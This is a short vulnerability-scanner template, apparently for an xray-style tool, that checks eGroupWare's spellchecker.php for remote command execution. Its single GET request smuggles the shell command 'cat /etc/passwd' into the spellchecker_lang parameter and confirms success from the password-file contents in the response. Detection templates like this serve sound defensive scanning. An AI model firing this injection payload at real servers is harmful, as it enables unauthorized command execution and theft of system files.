id: poc-yaml-egroupware-spellchecker-php-rce
info:
  name: eGroupWare spellchecker.php 远程命令执行漏洞
  severity: critical
  tags:
  - rce
  finger: egroupware
  fofa: SerenIP
requests:
- method: GET
  path: /egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%7C%7Ccat+/etc/passwd%7C%7C
  expression: 'status_code == 200

    && contains(body,"root:")

    && contains(body,"/bin")

    && contains(body,"error = ")

    '
variables: {}
transport: http
